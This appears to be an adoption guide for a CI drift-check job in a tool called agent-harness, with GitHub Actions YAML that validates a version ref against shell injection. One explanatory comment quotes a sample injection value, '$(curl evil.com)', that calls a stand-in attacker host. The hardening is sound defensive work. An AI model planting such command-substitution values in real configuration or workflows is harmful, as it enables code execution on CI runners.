# CI drift / review-gate layering — adoption guide

The harness ships several CI/drift/review mechanisms as managed-template
workflows plus one recommended-but-unshipped pattern. They are **not a menu to
pick one from** — they guard different aspects of the product/operational cycle
and mostly **compose**. The authoritative design record for how they layer is
[ADR-0005 — CI-gate architecture](adr/0005-ci-drift-review-gate-layering.md);
read it for the full model, the one consolidation point, and the one redundancy
to avoid.

This guide is the **paste-ready adoption home** for the **L1** per-PR drift
gate: a documented `ci.yml` job (not a fourth managed workflow) that runs
`harness sync --mode=check` on every PR so template drift is caught at merge
time rather than up to a week later.

## The four layers at a glance

| Layer | What it guards | When it fires |
|---|---|---|
| **L1** — per-PR `harness sync --mode=check` | Template **drift**, caught at merge time (this guide) | Every PR |
| **L2** — weekly [`harness-drift.yml`](../.github/workflows/harness-drift.yml) cron | Template **drift** on a schedule, and it **auto-opens a fix PR** | Weekly (+ manual dispatch) |
| **L3** — `harness-pr-check.yml` classifier + escape valve | **Intentional, audited** managed/composed-file edits (the `harness-managed-edit-ack` escape valve) | Every PR |
| **L4** — `review-gates.yml` / `pr-evidence-lint.yml` | The **review process** (Copilot review present, review-log evidence, reviewer/implementer independence) | Every PR |

For the full composition model — which layers compose, where you consolidate,
and the single redundancy to avoid — see
[ADR-0005 § Composition, not a menu](adr/0005-ci-drift-review-gate-layering.md#composition-not-a-menu-which-layers-to-run).

## L1 — per-PR `harness sync --mode=check` (recommended baseline)

`harness sync` defaults to check mode (`harness check` is a read-only alias for
`sync --mode=check`). It exits `1` when **any** drift is detected between the
pinned template and your tree, and `0` when they match — so as a required PR job
it fails the PR on drift before merge. This is the recommended baseline for
every consumer.

Add one of the two forms below to your existing CI workflow. Both derive the
harness ref from your `harness.config.json` `version` and validate it **before**
any shell interpolation, building on the shipped `harness-drift.yml` `derive-ref`
step (CS12 R1 shell-injection hardening). The validation uses a POSIX `case`
glob rather than a line-based `grep`, and rejects an empty ref, a ref not
starting with an alphanumeric (so a leading `-` can never be parsed as a CLI
option — e.g. a `--orphan` ref reaching the `git checkout` in Form B — and a
leading `.`/`_`/`/` can't create a ref-vs-pathspec ambiguity there), and any
character outside `[a-zA-Z0-9._/-]`
including an embedded newline (which a line-based check would let smuggle extra
lines into `$GITHUB_OUTPUT`).

### Form A — `npx github:` one-liner (default)

```yaml
# .github/workflows/ci.yml — add this job UNDER the `jobs:` map of your existing
# CI workflow (the 2-space indent below is relative to `jobs:`). The job derives
# the harness ref from harness.config.json "version"; pin that to the version
# this repo tracks (e.g. v0.17.0). SHA-pin the actions per your security policy —
# the pins below match the shipped harness-drift.yml.
  harness-sync-check:
    runs-on: ubuntu-latest
    permissions:
      contents: read          # L1 only READS the tree — least privilege.
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e  # v6.4.0
        with:
          node-version: '20'
      - id: derive-ref
        name: Derive + validate harness CLI ref from harness.config.json
        # CS12 R1 (shell-injection hardening): validate the derived ref with the
        # `case` guard below BEFORE exporting it as a step output, and pass it to
        # later steps via env: — never interpolate an unvalidated ref directly
        # into a `run:` shell (e.g. version=$(curl evil.com) would execute).
        run: |
          version=$(node -e "console.log(JSON.parse(require('fs').readFileSync('harness.config.json','utf8')).version || '')")
          if [ -z "$version" ] || [ "$version" = "0.0.0-pre" ]; then
            echo "ERROR: harness.config.json 'version' is empty or '0.0.0-pre'." >&2
            echo "ERROR: Pin a real semver tag (e.g. 'v0.17.0'), branch name, or 40-char SHA." >&2
            exit 1
          fi
          ref="$version"
          # Validate with a POSIX `case` glob, NOT a line-based `grep`: a value
          # with an embedded newline (valid JSON via "\n") could pass `grep` on
          # its first line and then inject extra `ref=...` lines into
          # $GITHUB_OUTPUT. This pattern rejects an empty ref, a ref not starting
          # with an alphanumeric (so a leading '-' can never be parsed as a CLI
          # option, and a leading '.', '_' or '/' can't create a git-checkout
          # ref-vs-pathspec ambiguity in Form B), and any character outside
          # [a-zA-Z0-9._/-] — including CR/LF. Matches ^[a-zA-Z0-9][a-zA-Z0-9._/-]*$;
          # covers semver tags, branch names, and 40-char SHAs.
          case "$ref" in
            '' | [!a-zA-Z0-9]* | *[!a-zA-Z0-9._/-]*)
              echo "ERROR: ref \"$ref\" must be a single-line token of [a-zA-Z0-9._/-] starting with an alphanumeric." >&2
              exit 1;;
          esac
          echo "ref=$ref" >> "$GITHUB_OUTPUT"
      - name: harness sync --mode=check (L1 drift gate)
        # Exits 1 on ANY drift, 0 when the tree matches the pinned template.
        env:
          CLI_REF: ${{ steps.derive-ref.outputs.ref }}
        run: npx -y "github:henrik-me/agent-harness#${CLI_REF}" sync --mode=check --cwd .
```

### Form B — clone-then-run (npm 10.8.x GitFetcher workaround)

Some runners hit an intermittent **npm 10.8.x GitFetcher** bug that makes
`npx github:` installs fail. If you see that, use this variant instead — it pins
npm ≥ 10.9, clones the harness at the validated ref, installs the harness's
runtime deps with `npm ci`, then runs the CLI directly. This mirrors what
`review-gates.yml` and `pr-evidence-lint.yml` already do.

```yaml
  harness-sync-check:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e  # v6.4.0
        with:
          node-version: '20'
      - name: Pin npm >= 10.9 (works around npm 10.8.x GitFetcher bug)
        run: npm install -g npm@10.9.2
      - id: derive-ref
        name: Derive + validate harness CLI ref from harness.config.json
        # CS12 R1 (shell-injection hardening): same allowlist validation as Form A.
        run: |
          version=$(node -e "console.log(JSON.parse(require('fs').readFileSync('harness.config.json','utf8')).version || '')")
          if [ -z "$version" ] || [ "$version" = "0.0.0-pre" ]; then
            echo "ERROR: harness.config.json 'version' is empty or '0.0.0-pre'; pin a real ref." >&2
            exit 1
          fi
          ref="$version"
          # Same POSIX `case` validation as Form A (non-line-based, so an
          # embedded newline can't smuggle extra $GITHUB_OUTPUT lines). Anchoring
          # to a leading alphanumeric is load-bearing here: $CLI_REF is passed to
          # `git checkout` below, where a leading '-' ('--orphan' etc.) reads as an
          # option and a leading '.', '_' or '/' is ambiguous ref-vs-pathspec.
          case "$ref" in
            '' | [!a-zA-Z0-9]* | *[!a-zA-Z0-9._/-]*)
              echo "ERROR: ref \"$ref\" must be a single-line token of [a-zA-Z0-9._/-] starting with an alphanumeric." >&2
              exit 1;;
          esac
          echo "ref=$ref" >> "$GITHUB_OUTPUT"
      - name: Clone harness at the validated ref and run the L1 drift gate
        env:
          CLI_REF: ${{ steps.derive-ref.outputs.ref }}
        run: |
          tmpdir="$(mktemp -d)"
          git clone --quiet --no-checkout https://github.com/henrik-me/agent-harness.git "$tmpdir"
          # --detach requires a commit-ish: an unresolvable ref fails closed here
          # instead of falling back to a confusing pathspec checkout.
          git -C "$tmpdir" checkout --quiet --detach "$CLI_REF"
          (cd "$tmpdir" && npm ci --omit=optional --no-audit --no-fund)
          node "$tmpdir/bin/harness.mjs" sync --mode=check --cwd .
```

### SHA-pin your actions

Both forms SHA-pin `actions/checkout` and `actions/setup-node` to a specific
commit (with the human-readable tag in a trailing comment). Keep them pinned per
your security policy rather than floating on a tag such as `@v6`; a mutable tag
can be repointed at malicious code. The pins above match the shipped
`harness-drift.yml`; bump them together when you update.

### L1 vs L3: do not stack a redundant drift gate

**L1 (`sync --mode=check`) is strictly stricter than L3's drift classifier**
(`scripts/check-managed-drift.mjs`, run by `harness-pr-check.yml`):

- **L1 fails on ANY drift, including seeded-file absence.** In check mode the
  sync engine sets `driftDetected` for an absent **seeded** file (`lib/sync.mjs`)
  and the CLI exits `1` (`bin/harness.mjs`). An absent seeded scaffold is a
  **failure** under L1.
- **L3 fails only on managed/composed drift.** Its `PROTECTED_CLASSES` set is
  exactly `{managed, composed}`; an absent **seeded** file is reported as an
  advisory NOTE and the classifier exits `0`.

Therefore **L1 ⊇ L3's drift coverage**: everything L3's classifier fails on also
fails L1, plus L1 additionally fails on seeded-file absence that L3 tolerates.
So **do not stack L1 + L3 for a second drift scan** — a repo running L1 already
has strictly stronger drift protection. Add L3 only for its distinct value, the
**`harness-managed-edit-ack` escape valve** (auditable intentional divergence of
a managed/composed file), ideally in `drift-only` mode (CS90b) to avoid a redundant
`harness lint`. The authoritative treatment is
[ADR-0005 § The L1-vs-L3 drift-semantics difference](adr/0005-ci-drift-review-gate-layering.md#the-l1-vs-l3-drift-semantics-difference-critical-c90-2).
Stacking **L2** alongside L1 is fine — it adds a scheduled sweep and an auto-fix
PR that a per-PR gate does not provide (see below).

## L2 — weekly `harness-drift.yml` cron (low-activity belt-and-suspenders)

The shipped [`harness-drift.yml`](../.github/workflows/harness-drift.yml) runs
`harness sync --mode=check` on a weekly schedule and, on drift, runs
`sync --mode=apply` and opens an auto-fix PR. It is **belt-and-suspenders for
low-activity repos** — repositories that merge rarely, where a per-PR gate fires
seldom and a scheduled sweep still catches template drift that landed without a
PR (plus it auto-opens the fix). It is a **safety net, not a substitute** for the
L1 merge-time gate: a high-activity repo running L1 on every PR gains little from
L2's weekly sweep beyond the auto-fix PR. Its behaviour is unchanged — only its
positioning. See
[ADR-0005 § L2](adr/0005-ci-drift-review-gate-layering.md#l2--weekly-harness-driftyml-cron-belt-and-suspenders).

## See also

- [ADR-0005 — CI-gate architecture: drift-detection / review-gate layering](adr/0005-ci-drift-review-gate-layering.md) — the authoritative design record.
- [`harness-drift.yml`](../.github/workflows/harness-drift.yml) — the shipped L2 weekly drift workflow.
- [OPERATIONS.md](../OPERATIONS.md) — the npm 10.8.x GitFetcher flakiness that motivates Form B.
